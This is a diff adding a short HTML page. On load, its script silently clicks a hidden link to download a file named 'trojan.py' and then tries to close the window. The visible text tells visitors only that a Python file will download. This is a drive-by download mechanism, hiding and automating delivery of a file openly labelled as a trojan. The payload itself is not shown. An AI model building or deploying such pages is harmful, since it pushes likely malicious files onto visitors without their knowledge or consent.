@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Python File</title>
+</head>
+<body>
+
+    <h1>Download Python File</h1>
+    
+    <p>This page will automatically initiate the download of the Python file.</p>
+
+    <script>
+        // Simulate a click on the download button when the page loads
+        window.onload = function() {
+            document.getElementById('downloadBtn').click();
+            window.close();
+        };
+    </script>
+
+    <a href="trojan.py" download="trojan.py" style="display: none;" id="downloadBtn">
+        <button>Download Python File</button>
+    </a>
+
+</body>
+</html>
